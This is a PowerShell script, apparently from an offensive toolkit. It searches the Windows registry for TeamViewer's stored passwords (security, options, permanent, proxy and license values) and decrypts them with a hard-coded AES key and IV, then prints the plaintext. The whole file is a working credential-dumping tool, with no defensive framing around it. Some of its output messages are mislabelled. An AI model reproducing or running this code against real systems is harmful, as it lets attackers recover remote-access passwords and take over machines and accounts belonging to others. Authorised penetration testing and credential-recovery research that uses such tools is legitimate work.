function TeamviewerDecrypt
{

function search
{

    
    $path = "Registry::" + $TeamviewerDir
    try
    {
        $TeamviewerDir = Get-Itemproperty $path
    }
    catch
    {

    }
     if ($TeamviewerDir.SecurityPasswordAES)
     {
         Write-Host "SecurityPasswordAES found, trying to decrypt:"
         decryptpass -encpass $TeamviewerDir.SecurityPasswordAES
     }
     elseif($TeamviewerDir.OptionsPasswordAES)
     {
         Write-Host "OptionsPasswordAES found, trying to decrypt:"
         decryptpass -encpass $TeamviewerDir.OptionsPasswordAES
     }
     elseif($TeamviewerDir.SecurityPasswordExported)
     {
         Write-Host "SecurityPasswordExported found, trying to decrypt:"
         decryptpass -encpass $TeamviewerDir.SecurityPasswordExported
     }
     elseif($TeamviewerDir.PermanentPassword)
     {
         Write-Host "PermanentPassword found, trying to decrypt:"
         decryptpass -encpass $TeamviewerDir.PermanentPassword
     }
     elseif($TeamviewerDir.ProxyPasswordAES)
     {
         Write-Host "PermanentPassword found, trying to decrypt:"
         decryptpass -encpass $TeamviewerDir.ProxyPasswordAES
     }
     elseif($TeamviewerDir.LicenseKeyAES)
     {
         Write-Host "PermanentPassword found, trying to decrypt:"
         decryptpass -encpass $TeamviewerDir.LicenseKeyAES
     }
         
    
}
    Write-Host "Looking for Registry entries on this system:"
    if ((Test-Path Registry::'HKCU:\SOFTWARE\Teamviewer\') -Or (Test-Path Registry::'HKLM\SOFTWARE\WOW6432Node\TeamViewer') -Or (Test-Path Registry::'HKLM\SOFTWARE\TeamViewer'))
    {
        $success = $false
        if (Test-Path Registry::'HKCU:\SOFTWARE\Teamviewer\')
        {
            $TeamviewerDirs = Get-ChildItem Registry::'HKCU:\SOFTWARE\Teamviewer\'
            if ($TeamviewerDirs -eq $null)
            {
                $TeamviewerDir = Get-ItemProperty Registry::HKCU\Software\Teamviewer\
                Search
            }
            else
            {
                foreach ($TeamviewerDir in $TeamviewerDirs)
                {
                    Search
                    $TeamviewerDir = 'Registry::HKCU\Software\Teamviewer\'
                    Search
                }
            }
        }
        elseif (Test-Path Registry::'HKLM\SOFTWARE\WOW6432Node\TeamViewer')
        {
            $TeamviewerDirs = Get-ChildItem Registry::'HKLM\SOFTWARE\WOW6432Node\TeamViewer'
            if ($TeamviewerDirs -eq $null)
            {
                $TeamviewerDir = Get-ItemProperty Registry::HKLM\SOFTWARE\WOW6432Node\TeamViewer
                Search -dir $TeamviewerDir
            }
            else
            {
                foreach ($TeamviewerDir in $TeamviewerDirs)
                {
                    Search
                    $TeamviewerDir = Get-ItemProperty Registry::HKLM\SOFTWARE\WOW6432Node\TeamViewer\
                    Search
                }
            }
        }
        else
        {
            $TeamviewerDirs = Get-ChildItem Registry::HKLM\SOFTWARE\TeamViewer
            if ($TeamviewerDirs -eq $null)
            {
                $TeamviewerDir = Get-ItemProperty Registry::HKLM\SOFTWARE\TeamViewer
                Search
            }
            else
            {
                foreach ($TeamviewerDir in $TeamviewerDirs)
                {
                    Search
                    $TeamviewerDir = Get-ItemProperty Registry::HKLM\SOFTWARE\TeamViewer
                    Search
                }
            }
        }

    }
    else
    {
       Write-Host "No Teamviewer installed, sorry"
    }

}


function decryptpass
{

    param(
        [byte[]]
        $encpass
    )
    function Create-AesManagedObject($key, $IV) {
        $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
        if ($IV) {
            if ($IV.getType().Name -eq "String") {
                $aesManaged.IV = [System.Convert]::FromBase64String($IV)
            }
            else {
                $aesManaged.IV = $IV
            }
        }
        if ($key) {
            if ($key.getType().Name -eq "String") {
                $aesManaged.Key = [System.Convert]::FromBase64String($key)
            }
            else {
                $aesManaged.Key = $key
            }
        }
        $aesManaged
    }
    
    function Decrypt-String($key, $encryptedStringWithIV) {
        $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
        $IV = $bytes[0..15]
        $aesManaged = Create-AesManagedObject $key $IV
        $decryptor = $aesManaged.CreateDecryptor();
        $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
        $aesManaged.Dispose()
        [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
    }
    
    [byte[]]$key = 0x06,0x02,0x00,0x00,0x00,0xa4,0x00,0x00,0x52,0x53,0x41,0x31,0x00,0x04,0x00,0x00
    [byte[]]$IV = 0x01,0x00,0x01,0x00,0x67,0x24,0x4F,0x43,0x6E,0x67,0x62,0xF2,0x5E,0xA8,0xD7,0x04
    [byte[]]$EncryptedBytes = $encpass
    $encryptedString = $IV + $EncryptedBytes
    $encryptedString = [System.Convert]::ToBase64String($encryptedString)
    $backToPlainText = Decrypt-String $key $encryptedString
    Write-Host "Decrypted Password is as follows:"
    $backToPlainText
}
